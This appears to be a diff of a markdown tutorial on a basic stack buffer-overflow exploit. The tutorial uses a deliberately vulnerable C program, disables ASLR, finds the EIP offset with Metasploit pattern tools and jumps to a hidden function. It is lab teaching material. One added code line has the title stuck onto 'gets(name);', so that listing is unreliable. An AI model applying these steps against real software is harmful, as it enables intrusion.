@@ -6,7 +6,7 @@ When buffer overflow occurs, attacker can run malicious code accordingly and may
 
 I introduce a very simple way to develop the buffer overflow exploit.  No complicated procedure can be observed.  The exploit development is running on 64-bit Kali Linux.
 
-The following is the C source code of the "vuln.c" :
+The following is the C source code of the ```vuln.c``` :
 
 ```c
 #include <stdio.h>
@@ -20,7 +20,7 @@ void inSecure()
 {
         char name[30];
         printf("What is your name?\n");
-        gets(name);
+        gets(name);Basic Buffer Overflow Exploit Make Easy
         printf("Hey %s, you're harmless, aren't you?\n", name);
 }
  
@@ -51,7 +51,7 @@ To make it simple, we disable the Address Space Layout Randomization (ASLR) :
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
-In order to inspect the executable file, we need to download a tool namely "checksec.sh".
+In order to inspect the executable file, we need to download a tool namely ```checksec.sh```.
 
 ```bash
 wget https://www.trapkit.de/tools/checksec.sh
@@ -67,7 +67,7 @@ dos2unix checksec.sh
 chmod +x checksec.sh
 ```
 
-Run the following command and you will find out that "NX" is enabled.
+Run the following command and you will find out that ```NX``` is enabled.
 
 ```bash
 ./checksec.sh --file vuln
@@ -178,9 +178,9 @@ gs             0x63                0x63
 (gdb)
 ```
 
-We noticed that the EIP is overwritten with "A".  That means, we can control the EIP then.  Once EIP can be controlled, we can run any code from that point.  It is because EIP Instruction Pointer Register always contains the address of the next instruction to be executed.
+We noticed that the EIP is overwritten with ```A```.  That means, we can control the EIP then.  Once EIP can be controlled, we can run any code from that point.  It is because EIP Instruction Pointer Register always contains the address of the next instruction to be executed.
 
-Now, we need to find out how many junk characters to cause the crash.  We use the "pattern_create.rb" to create a unique pattern.
+Now, we need to find out how many junk characters to cause the crash.  We use the ```pattern_create.rb``` to create a unique pattern.
 
 Open another terminal and run :
 
@@ -205,7 +205,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 The program is crashed again as expected.
 
-We check the registers again and found out that EIP is overwritten with "0x41346241".
+We check the registers again and found out that EIP is overwritten with ```0x41346241```.
 
 ```bash
 (gdb) info registers
@@ -231,14 +231,14 @@ gs             0x63                0x63
 (gdb)
 ```
 
-We use the tool namely "pattern_offset.rb" to find out the offset.  The offset is 42 for this case.
+We use the tool namely ```pattern_offset.rb``` to find out the offset.  The offset is 42 for this case.
 
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41346241
 [*] Exact match at offset 42
 ```
 
-According to the source code, we know that there are 3 functions, they are main, inSecure and hacker.  Our aim here is to run hidden function "hacker".  So, we need to find out the address of the function of hacker.
+According to the source code, we know that there are 3 functions, they are main, inSecure and hacker.  Our aim here is to run hidden function ```hacker```.  So, we need to find out the address of the function of hacker.
 
 ```bash
 (gdb) info functions
@@ -296,11 +296,11 @@ End of assembler dump.
 (gdb)
 ```
 
-We find out that the address of function hacker is "0x565561b9".
+We find out that the address of function hacker is ```0x565561b9```.
 
 Now, the payload will be as the following :
 
-42's "A" and [the address of hacker function]
+42's "A" and (the address of hacker function)
 
 The PoC Python code "poc.py" :
 
@@ -396,7 +396,7 @@ gs             0x63                0x63
 0xffffd38c: 0x56556080  0x00000000
 ```
 
-The EIP address is 0xffffd32c.<br>
+The EIP address is ```0xffffd32c```.
 
 
 Samiux  
